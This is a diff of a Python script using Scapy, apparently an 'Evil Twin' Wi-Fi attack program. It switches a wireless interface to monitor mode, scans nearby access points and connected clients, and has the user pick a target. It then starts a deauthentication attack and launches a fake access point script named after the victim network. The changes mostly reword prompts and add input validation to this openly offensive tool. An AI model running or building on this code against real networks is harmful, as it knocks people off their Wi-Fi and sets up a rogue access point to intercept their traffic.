@@ -6,16 +6,17 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
 # Reference to the scanning parts - https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
 
 # import json
-
+#Notations: SSID = Network name ,BSSID = AP mac address , ESSID = A set of ssids (network names)
 ap_list = []
 ### Coloum indices for 'ap_list'. 
 ESSID = 0
-BSSID = 1
+BSSID = 1 
 CHANNEL = 2
 essids_set = set()
 
 client_list = []
 
+time_out = 40
 
 ### Console colors
 W  = '\033[0m'  # white 
@@ -29,108 +30,88 @@ GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 
 
+######################################## INTERFACE MODE ###################################
 
-##############################################
-############### Interface Mode ###############
-##############################################
-
-### In this function the user choose the interface that will scan the network and send the deauthentication packets. 
-### In order to do so, we need to switched this interface to 'monitor mode'. 
+###Turn on monitor mode 
+### Select the interface that will turned on to monitor mode to perform hardware and software low level network system operations such as scan wifi networks && send deauth packets.
 def monitor_mode():
     global interface
-    print(G + "*** Step 1:  Choosing an interface to put in 'monitor mode'. *** \n")
-    empty = input ("Press Enter to continue.........")
+    print(G + "*** 1. Turn on 'monitor mode' for the desired interface. *** \n")
+    #entr = input ("Press Enter to continue.........")
     print(W)
     os.system('ifconfig')
-    interface = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
+    interface = input(G + "Please enter the interface name you want to put in 'monitor mode' and press enter: ")
     print(W)
     # Put the choosen interface in 'monitor mode'
     os.system('ifconfig ' + interface + ' down')
     os.system('iwconfig ' + interface + ' mode monitor')
     os.system('ifconfig ' + interface + ' up')
-    # os.system('iwconfig') # Check
 
-
-### After we finish our attack, we want to switch back the interface to 'managed mode'. 
+###Turn on managed mode 
+### End of the attack attack, switch back the interface to 'managed mode'. 
 def managed_mode():
-    print(G + "\n*** Step 5: Put the interface back in 'managed mode'. *** \n")
-    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........")
+    print(G + "*** 5. Turn on 'managed mode' for the desired interface : "+interface+ " *** \n")
     print(W)
     # Put the choosen interface back in 'managed mode'
     os.system('ifconfig ' + interface + ' down')
     os.system('iwconfig ' + interface + ' mode managed')
     os.system('ifconfig ' + interface + ' up')
-    print(B + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
-    os.system('iwconfig')
 
+    
 
-
-
-##############################################
-############### APs Scanning #################
-##############################################
+######################################## SCAN NETWORK ###################################
 
 ### Rapper function for 'wifi_scan()'. 
 def ap_scan_rap():
-    print(G + "*** Step 2: Scanning the network for AP to attack. *** \n")
-    empty = input ("Press Enter to continue.........")
-    # os.system ('airodump-ng ' + interface)
+    print(G + "*** 2: Start network sniffer to find the available APS for the attack. *** \n")
     ap_scan()
 
                                          
-### In this fucntion we scan the network for nearby access points. 
-### We present to the user all the APs that were found, and he choose which AP he want to attack. 
+### Scan the network and show the list of APS that were found
 def ap_scan():
-    global search_timeout
-    search_timeout = int(input(G + "Please enter the scanning time frame in seconds: "))
     channel_changer = Thread(target = change_channel)
     # A daemon thread runs without blocking the main program from exiting
     channel_changer.daemon = True
     channel_changer.start()
-    print("\n Scanning for networks...\n")
+    print("\n      Scanning for networks...\n")
     # Sniffing packets - scanning the network for AP in the area
     # iface – the interface that is in monitor mode
     # prn – function to apply to each packet
     # timeout – stop sniffing after a given time
-    sniff(iface = interface, prn = ap_scan_pkt, timeout=search_timeout)
+    sniff(iface = interface, prn = ap_scan_pkt, timeout=time_out)
     num_of_ap = len(ap_list)
     # If at least one AP was found, print all the found APs
     if num_of_ap > 0: 
         # If at least 1 AP was found. 
-        print("\n*************** APs Table ***************\n")
+        print("\n*************** APs list ***************\n")
         for x in range(num_of_ap):
             print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
         print("\n************* FINISH SCANNING *************\n")
+        invalidInput = True
         # Choosing the AP to attack
-        ap_index = int(input("Please enter the number of the AP you want to attack: "))
-        # Print the choosen AP
-        print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
-        # Set the channel as the choosen AP channel in order to send packets to connected clients later
-        set_channel(int(ap_list[ap_index][CHANNEL]))
-        # Save all the needed information about the choosen AP
-        global ap_mac
-        global ap_name
-        global ap_channel
-        ap_mac = ap_list[ap_index][BSSID]
-        ap_name = ap_list[ap_index][ESSID]
-        ap_channel = ap_list[ap_index][CHANNEL]
-        '''
-        data = {}
-        data['AP'] = []
-        data['AP'].append({
-            'name': ap_name,
-            'chnnel': ap_channel,
-            'mac': ap_mac
-            })
-        with open('data.txt', 'w') as outfile:
-            json.dump(data, outfile)
-            '''
-        # client_scan_rap()
+        while invalidInput:  
+            ap_index = int(input("Please enter the number of the AP in the list you want to attack and press enter: "))
+            #validate user input 
+            if ap_index < 0 or ap_index > num_of_ap:
+                print("Invalid input - AP number is not in the list choose again. \n")
+            else:
+                # Print the choosen AP
+                print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(ap_list[ap_index][CHANNEL]) + " AP name: " + ap_list[ap_index][ESSID])
+                # Set the channel as the choosen AP channel in order to send packets to connected clients later
+                set_channel(int(ap_list[ap_index][CHANNEL]))
+                # Save all the needed information about the choosen AP
+                global ap_mac
+                global ap_name
+                global ap_channel
+                ap_mac = ap_list[ap_index][BSSID]
+                ap_name = ap_list[ap_index][ESSID]
+                ap_channel = ap_list[ap_index][CHANNEL]
+                invalidInput = False
     else: 
         # If no AP was found. 
         rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
         if rescan == "n":
-            print("  Sorry :(  ")
+            print("  Enable interface mode managed and exit the program ")
             managed_mode()
             sys.exit(0)
         else:
@@ -181,16 +162,13 @@ def ap_scan_pkt(pkt):
 
 
 
-##############################################
-############# Clients Scanning ###############
-##############################################
+######################################## SCAN CLIENTS ###################################
 
 ### Rapper function for 'client_scan()'. 
 def client_scan_rap():
-    print(G + "\n*** Step 3: Verifying that at least 1 client is connected to the AP you choose. *** \n")
-    empty = input ("Press Enter to continue.........")
+    print(G + "\n*** 3. Start sniffer to find the AP connected clients *** \n")
+    print(G+ "\n      Scanning for clients...\n")
     print(W)
-    # os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
     client_scan()
     print("\n")
 
@@ -198,17 +176,8 @@ def client_scan_rap():
 ### In this fucntion we scan the network for clients who are connected to the choosen AP. 
 ### We present to the user all the clients that were found, and he choose which client he want to attack. 
 def client_scan():
-    # We need the client to send packet to the AP and it may take time, so we double the scan time
-    s_timeout = search_timeout * 2
-    print(G + "\nScanning for clients that connected to: " + ap_name + " ...")
-    '''
-    channel_changer = Thread(target=change_channel)
-    # A daemon thread runs without blocking the main program from exiting
-    channel_changer.daemon = True
-    channel_changer.start()
-    '''
     # Sniffing packets - scanning the network for clients which are connected to the choosen AP 
-    sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
+    sniff(iface=interface, prn=client_scan_pkt, timeout=time_out)
     num_of_client = len(client_list)
     # If at least one client was found, print all the found clients
     if num_of_client > 0: 
@@ -217,29 +186,36 @@ def client_scan():
         for x in range(num_of_client):
             print("[" + str(x) + "] - "+ client_list[x])
         print("\n************** FINISH SCANNING **************\n")
-        # Choosing the AP to attack
-        client_index = input("Please enter the number of the client you want to attack or enter 'R' if you want to rescan: ")
+        # Choosing the client to attack
+        client_index = input("Please enter the number of the client in the list you want to attack or enter 'R' if you want to rescan and press enter: ")
         if client_index == 'R': 
             # Rescan
             client_scan()
         elif client_index.isnumeric():
             # Client was choosen
-            # Print the choosen AP
-            print("You choose the client: [" + client_index + "] - "+ client_list[int(client_index)])
-            global client_mac
-            # Save the needed information about the choosen client
-            client_mac = client_list[int(client_index)]
-            # deauth_attack()
+            invalidInput = True
+            while invalidInput:  
+                #validate user input 
+                client_index_invalid = int(client_index)
+                if client_index_invalid < 0 or client_index_invalid > num_of_client:
+                    print("Invalid input - Client number is not in the list choose again. \n")
+                    client_index = input("Please enter the number of the client you want to attack and press enter:")
+                else:
+                    print("You choose the client: [" + client_index + "] - "+ client_list[int(client_index)])
+                    global client_mac
+                    # Save the needed information about the choosen client
+                    client_mac = client_list[int(client_index)]
+                    invalidInput = False
+
     else: 
         # If no client was found. 
         rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
         if rescan == "n":
-            print("  Sorry :(  ")
+            print(" Enable interface mode managed and exit the program ")
             managed_mode()
             sys.exit(0)
         else:
             client_scan()
-  
 
 ### sniff(..., prn = client_scan_pkt, ...) 
 ### The argument 'prn' allows us to pass a function that executes with each packet sniffed 
@@ -252,23 +228,15 @@ def client_scan_pkt(pkt):
             if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                 # Add the new found client to the client list
                 client_list.append(pkt.addr1)
-                print("Client with MAC address: " + pkt.addr1 + " was found.")
 
 
+######################################## Deauthentication Attcak ###################################
 
 
-
-
-##############################################
-########## Deauthentication Attcak ###########
-##############################################
-
-### In this fucntion we ATTACK. YAY!
 ### We send the deauthentication packets between the choosen AP and client. 
 def deauth_attack():
-    print("\n*** Step 4: Disconnect the connection between the AP from the client. *** \n")
+    print("\n*** 4: Perform Deauthentication Attcak to disconnect the AP and the client. *** \n")
     print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
-    empty = input ("Press Enter to start sending the Deauthentication packets.........")
     print(W)
     # Open a new terminal for 'fake_ap.py'
     os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
@@ -280,23 +248,25 @@ def deauth_attack():
 
 if __name__ == "__main__":
     
+    ###Process must be execute as root to perform system hardware && software actions.
     if os.geteuid():
         sys.exit(R + '[**] Please run as root')
     
-    print(B + "********************************************************************** \n")
-    print("***** Part 1: choosing the AP we want to attck and attacks it ;) ***** \n")
+    print(P + "********************************************************************** \n")
+    print("***** Welcome to the EVIL TWIN ATTACK program***** \n")
+    #print("***** Part A: SELECT the AP we want to attack ***** \n")
     print("********************************************************************** \n")
     
-    ### Step 1: Choosing the interface for monitoring, and put it in monitor mode. 
+    ### Step 1: Select an interface and turn on moitor mode for it. 
     monitor_mode()
 
     ### Step 2: Choosing the AP that we want to attack. 
     ap_scan_rap()
     
-    ### Step 3: Checking that the choosen AP have client that connected to it.
+    ### Step 3: Checking that the choosen AP have client that connected to it and choose a client that will be disconnected. 
     client_scan_rap()
     
-    ### Step 4: Running the deauthentication script.
+    ### Step 4: Running deauthentication attack.
     deauth_attack()
     
     ### Step 5: Put the interface back in managed mode  
